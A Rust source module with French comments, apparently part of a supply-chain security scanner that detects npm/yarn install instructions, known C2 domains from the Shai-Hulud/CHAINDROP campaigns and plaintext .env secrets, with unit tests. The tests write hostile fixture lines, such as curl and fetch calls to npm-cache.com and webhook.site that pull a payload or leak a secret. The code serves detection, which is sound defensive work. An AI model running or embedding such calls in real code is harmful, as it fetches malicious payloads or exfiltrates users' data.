//! Détection passive dans le code source : instructions d'installation directes
//! (SPEC-F05), marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08) et
//! secrets en clair dans les fichiers `.env*` du workspace (SPEC-F08). Pour les
//! fichiers JS/TS/Python, une correspondance trouvée à l'intérieur d'un commentaire
//! (`comments::comment_spans`) voit sa sévérité abaissée (`CommandFoundInComment`)
//! plutôt que d'être traitée comme une correspondance normale. Les regex et listes de
//! marqueurs/extensions viennent de `config: &IocsConfig` (`iocs.toml`, SPEC-F08).

use std::ops::Range;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use crate::comments::{comment_spans, is_within_comment, language_for_path};
use crate::hunt::{ThreatCategory, ThreatSignal};
use crate::iocs::IocsConfig;
use crate::progress::DotProgress;

/// Vrai si `content` contient une instruction d'installation npm ou yarn directe,
/// selon les regex de `config` (SPEC-F05).
pub fn contains_install_command(content: &str, config: &IocsConfig) -> bool {
    config.npm_install_regex.is_match(content) || config.yarn_install_regex.is_match(content)
}

/// Retourne les marqueurs C2 connus (`config.known_c2_markers`, SPEC-F08) présents
/// dans `content`.
pub fn find_known_c2_markers<'a>(content: &str, config: &'a IocsConfig) -> Vec<&'a str> {
    config
        .known_c2_markers
        .iter()
        .map(String::as_str)
        .filter(|marker| content.contains(marker))
        .collect()
}

fn is_excluded(path: &Path, config: &IocsConfig) -> bool {
    path.extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| {
            config
                .excluded_extensions
                .iter()
                .any(|excluded| excluded.eq_ignore_ascii_case(ext))
        })
}

/// Positions `[start, end)` de toutes les correspondances d'instruction d'installation
/// npm/yarn dans `content`.
fn install_command_matches(content: &str, config: &IocsConfig) -> Vec<(usize, usize)> {
    config
        .npm_install_regex
        .find_iter(content)
        .chain(config.yarn_install_regex.find_iter(content))
        .map(|m| (m.start(), m.end()))
        .collect()
}

/// Classe chaque marqueur C2 trouvé dans `content` selon qu'au moins une occurrence se
/// trouve hors d'un commentaire (`in_code`, sévérité normale) ou que **toutes** ses
/// occurrences sont dans un commentaire (`in_comment_only`, sévérité abaissée,
/// SPEC-F05/F08). `spans` vaut `None` pour les extensions non couvertes par le lexer
/// (`comments::language_for_path`), auquel cas tout marqueur trouvé reste `in_code`
/// (comportement historique, inchangé).
fn classify_c2_markers<'a>(
    content: &str,
    config: &'a IocsConfig,
    spans: Option<&[Range<usize>]>,
) -> (Vec<&'a str>, Vec<&'a str>) {
    let mut in_code = Vec::new();
    let mut in_comment_only = Vec::new();

    for marker in find_known_c2_markers(content, config) {
        let all_in_comment = match spans {
            Some(spans) => content
                .match_indices(marker)
                .all(|(start, m)| is_within_comment(spans, start, start + m.len())),
            None => false,
        };
        if all_in_comment {
            in_comment_only.push(marker);
        } else {
            in_code.push(marker);
        }
    }

    (in_code, in_comment_only)
}

fn is_dotenv_file(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name.starts_with(".env"))
}

/// Vrai si `content` (contenu d'un fichier `.env*`) porte au moins une assignation
/// `CLE=valeur` en clair (SPEC-F08) — les valeurs interpolées via `${VAR}` restent
/// sûres et ne sont pas comptées.
fn has_literal_dotenv_secret(content: &str) -> bool {
    content.lines().any(|line| {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            return false;
        }
        let Some((_, value)) = trimmed.split_once('=') else {
            return false;
        };
        let value = value.trim().trim_matches('"').trim_matches('\'');
        !value.is_empty() && !value.starts_with("${")
    })
}

/// Résultat du scan passif d'un seul fichier (SPEC-F05/F08).
#[derive(Debug, Default)]
pub struct FileScanResult {
    pub threat_signals: Vec<ThreatSignal>,
    pub install_mention: Option<PathBuf>,
}

/// Scanne un seul fichier déjà présent sur disque (extensions exclues, SPEC-F05) à la
/// recherche de marqueurs C2 connus, d'une mention d'installation npm/yarn directe et,
/// pour les `.env*`, de secrets en clair (SPEC-F08). `None` si `path` est exclu ou
/// illisible. Fonction pure sans notion de parcours : réutilisée à la fois par
/// [`scan_workspace`] (son propre parcours, pour compatibilité/tests unitaires) et par
/// `workspace::walk_workspace` (parcours unifié du workspace, SPEC-F02) qui l'appelle
/// pour chaque entrée d'un seul passage partagé avec la découverte de projets.
pub fn scan_file(path: &Path, config: &IocsConfig) -> Option<FileScanResult> {
    if is_excluded(path, config) {
        return None;
    }
    let content = std::fs::read_to_string(path).ok()?;

    let mut result = FileScanResult::default();

    let spans = language_for_path(path).map(|lang| comment_spans(&content, lang));

    let install_matches = install_command_matches(&content, config);
    if !install_matches.is_empty() {
        let all_in_comment = match &spans {
            Some(spans) => install_matches
                .iter()
                .all(|(start, end)| is_within_comment(spans, *start, *end)),
            None => false,
        };
        // Une mention trouvée uniquement en commentaire (ex. « // npm install après
        // clonage ») est un indice déjà bénin (Debug uniquement) rendu plus bénin
        // encore par le contexte commentaire : ne pas la reporter du tout.
        if !all_in_comment {
            result.install_mention = Some(path.to_path_buf());
        }
    }

    let (real_markers, comment_only_markers) =
        classify_c2_markers(&content, config, spans.as_deref());
    if !real_markers.is_empty() {
        result.threat_signals.push(ThreatSignal {
            category: ThreatCategory::KnownC2Marker,
            detail: format!("marqueur(s) C2 connu(s) : {}", real_markers.join(", ")),
            path: path.to_path_buf(),
        });
    }
    if !comment_only_markers.is_empty() {
        result.threat_signals.push(ThreatSignal {
            category: ThreatCategory::CommandFoundInComment,
            detail: format!(
                "marqueur(s) C2 connu(s) trouvé(s) uniquement en commentaire, sévérité abaissée : {}",
                comment_only_markers.join(", ")
            ),
            path: path.to_path_buf(),
        });
    }

    if is_dotenv_file(path) && has_literal_dotenv_secret(&content) {
        result.threat_signals.push(ThreatSignal {
            category: ThreatCategory::ExposedSecret,
            detail: "fichier .env avec valeur(s) en clair détecté dans le workspace".to_string(),
            path: path.to_path_buf(),
        });
    }

    Some(result)
}

/// Scanne tous les fichiers du workspace, **dotfiles inclus** (hors extensions
/// exclues, SPEC-F05 — l'inclusion des fichiers cachés est nécessaire pour voir les
/// `.env*`, normalement élagués par le parcours standard, SPEC-F08). Effectue son
/// propre parcours (conservée pour compatibilité/tests unitaires en isolation, threads
/// toujours en auto-détection — pas exposée en configuration CLI comme
/// `workspace::walk_workspace`) — le chemin de production (`lib.rs::run`) passe par
/// `workspace::walk_workspace`, qui appelle [`scan_file`] pour chaque entrée d'un
/// unique parcours partagé avec la découverte de projets (SPEC-F02), plutôt que de
/// parcourir le disque une seconde fois.
pub fn scan_workspace(
    workspace_root: &Path,
    no_ignore: bool,
    config: &IocsConfig,
) -> (Vec<ThreatSignal>, Vec<PathBuf>) {
    let progress = DotProgress::new_disabled();
    let mut threat_signals = Vec::new();
    let mut install_mentions = Vec::new();

    let git_dirs = Arc::new(Mutex::new(Vec::new()));
    for entry in
        crate::walker::walk_including_hidden(workspace_root, &progress, no_ignore, git_dirs, 0)
    {
        let path = entry.path();
        if !entry.file_type().is_some_and(|ft| ft.is_file()) {
            continue;
        }
        if let Some(result) = scan_file(path, config) {
            threat_signals.extend(result.threat_signals);
            install_mentions.extend(result.install_mention);
        }
    }

    (threat_signals, install_mentions)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> IocsConfig {
        crate::iocs::load(None).unwrap()
    }

    #[test]
    fn detects_npm_and_yarn_install() {
        let config = default_config();
        assert!(contains_install_command("run `npm install` first", &config));
        assert!(contains_install_command("then yarn add lodash", &config));
        assert!(!contains_install_command("just some readme text", &config));
    }

    #[test]
    fn detects_documented_npm_install_ci_and_update_aliases() {
        let config = default_config();
        for alias in [
            "install", "add", "i", "in", "ins", "inst", "insta", "instal", "isnt", "isnta",
            "isntal", "isntall",
        ] {
            assert!(
                contains_install_command(&format!("npm {alias}"), &config),
                "npm install alias not detected: {alias}"
            );
        }
        for alias in [
            "ci",
            "clean-install",
            "ic",
            "install-clean",
            "isntall-clean",
        ] {
            assert!(
                contains_install_command(&format!("npm {alias}"), &config),
                "npm ci alias not detected: {alias}"
            );
        }
        for alias in ["update", "u", "up", "upgrade", "udpate"] {
            assert!(
                contains_install_command(&format!("npm {alias}"), &config),
                "npm update alias not detected: {alias}"
            );
        }
    }

    #[test]
    fn does_not_match_a_short_alias_as_a_prefix_of_another_word() {
        let config = default_config();
        assert!(!contains_install_command("npm inches", &config));
        assert!(!contains_install_command("npm updater", &config));
    }

    #[test]
    fn finds_known_c2_markers() {
        let config = default_config();
        assert_eq!(
            find_known_c2_markers("callback to https://npm-cache.com/x", &config),
            vec!["npm-cache.com"]
        );
        assert!(find_known_c2_markers("nothing suspicious here", &config).is_empty());
    }

    #[test]
    fn scan_workspace_separates_c2_signals_from_install_mentions() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("README.md"), "Run `npm install` to start.").unwrap();
        std::fs::write(
            dir.path().join("deploy.sh"),
            "curl https://npm-cache.com/payload",
        )
        .unwrap();
        // .js n'est plus exclu par extension (SPEC-F05/F08) : le lexer de commentaires
        // permet de le scanner sans exploser le taux de faux positifs sur du code réel.
        std::fs::write(
            dir.path().join("bundle.min.js"),
            "fetch('webhook.site/leaked-secret')",
        )
        .unwrap();
        // Extension structurelle, toujours exclue (pas de notion de "commentaire").
        std::fs::write(
            dir.path().join("data.json"),
            r#"{"note": "webhook.site should never be flagged here"}"#,
        )
        .unwrap();

        let (threat_signals, install_mentions) = scan_workspace(dir.path(), false, &config);

        assert_eq!(threat_signals.len(), 2);
        assert!(threat_signals
            .iter()
            .all(|s| s.category == ThreatCategory::KnownC2Marker));
        assert!(threat_signals.iter().any(|s| s.path.ends_with("deploy.sh")));
        assert!(threat_signals
            .iter()
            .any(|s| s.path.ends_with("bundle.min.js")));
        assert!(!threat_signals.iter().any(|s| s.path.ends_with("data.json")));

        assert_eq!(install_mentions.len(), 1);
        assert!(install_mentions[0].ends_with("README.md"));
    }

    #[test]
    fn downgrades_a_c2_marker_found_only_inside_a_js_comment() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("app.js"),
            "// TODO: block requests to npm-cache.com eventually\nconst safe = true;",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(
            threat_signals[0].category,
            ThreatCategory::CommandFoundInComment
        );
        assert!(threat_signals[0].detail.contains("npm-cache.com"));
    }

    #[test]
    fn keeps_full_severity_for_a_c2_marker_found_in_actual_js_code() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("app.js"),
            "fetch('https://npm-cache.com/payload');",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::KnownC2Marker);
    }

    #[test]
    fn downgrades_a_python_comment_mention_but_not_a_string_literal_one() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("script.py"),
            "# see npm-cache.com for context\nurl = \"https://official334.example/x\"\n",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);

        assert_eq!(threat_signals.len(), 2);
        assert!(threat_signals
            .iter()
            .any(|s| s.category == ThreatCategory::CommandFoundInComment
                && s.detail.contains("npm-cache.com")));
        assert!(threat_signals.iter().any(
            |s| s.category == ThreatCategory::KnownC2Marker && s.detail.contains("official334")
        ));
    }

    #[test]
    fn does_not_report_an_install_command_mention_found_only_in_a_comment() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("setup.ts"),
            "// run `npm install` after cloning\nexport const version = 1;",
        )
        .unwrap();

        let (_, install_mentions) = scan_workspace(dir.path(), false, &config);
        assert!(install_mentions.is_empty());
    }

    #[test]
    fn detects_a_literal_secret_in_a_dotenv_file() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".env.production"),
            "# comment\nAPI_TOKEN=sk_live_abcdef123456\n",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::ExposedSecret);
        assert!(threat_signals[0].path.ends_with(".env.production"));
    }

    #[test]
    fn ignores_a_dotenv_file_with_only_env_interpolated_values() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".env"), "API_TOKEN=${API_TOKEN}\n").unwrap();

        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);
        assert!(threat_signals.is_empty());
    }
}
